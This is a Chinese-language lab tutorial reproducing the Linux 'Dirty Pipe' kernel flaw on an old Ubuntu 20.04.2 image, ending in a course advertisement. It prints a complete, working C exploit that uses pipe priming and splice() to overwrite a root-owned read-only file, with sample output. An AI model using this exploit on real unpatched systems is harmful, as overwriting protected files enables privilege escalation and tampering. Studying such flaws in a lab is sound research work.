
为了复现`Dirty Pipe`漏洞，我们需要找一个合适的环境，通过`commit`的提交时间筛选出来20.04.2的Ubuntu进行复习。

如果使用的是桌面版本的ISO，那么在安装过程中自动安装新版本的内核，旧的内核仍在`boot`目录下，可以修改`grub.cfg`文件启动旧内核。

```
https://old-releases.ubuntu.com/releases/focal/ubuntu-20.04.2-desktop-amd64.iso
```

在当前系统中存在着一个名为`tmp.txt`的文件，它是一个只读文件不能被修改。

```
cat tmp.txt
1234567890-=
ls -lh tmp.txt
-r--r--r-- 1 root root 13 12月 16 18:35 b.txt
```

接下来根据上方的分析构造出exploit，用于改变只读文件`tmp.txt`。

```
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/user.h>

static void pipe_info_set(int pfd[2])
{
    unsigned int size, len, site;
    char buf[4096];

    pipe(pfd);
    size = fcntl(pfd[1], F_GETPIPE_SZ);
    site = size;

    while (site > 0) {
        len = site > sizeof(buf) ? sizeof(buf) : site;
        write(pfd[1], buf, len);
        site -= len;
    }

    site = size;
    while (site > 0) {
        len = site > sizeof(buf) ? sizeof(buf) : site;
        read(pfd[0], buf, len);
        site -= len;
    }
}

int main(int argc, char *argv[])
{
    int fd, pfd[2];
    ssize_t len;
    loff_t offset;

    if (argc != 3) {
        printf("usage: dirty_pipe_example $(file) $(data)\n");
        return -1;
    }

    fd = open(argv[1], O_RDONLY);
    if (fd < 0) {
        printf("open [%s] failed\n", argv[1]);
        return -2;
    }

    pipe_info_set(pfd);
    offset = 0;
    len = splice(fd, &offset, pfd[1], NULL, 1, 0);
    if (len <= 0) {
        printf("splice failed\n");
        return -3;
    }

    write(pfd[1], argv[2], strnlen(argv[2], 48));
    printf("please access file [%s]\n", argv[1]);
}
```

编译出可执行文件后，指定文件和数据提交修改信息，就可以修改只读文件了！

```
./dirty_pipe_example /tmp/tmp.txt ChangedByMe!
cat tmp.txt
1ChangedByMe!
```

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)
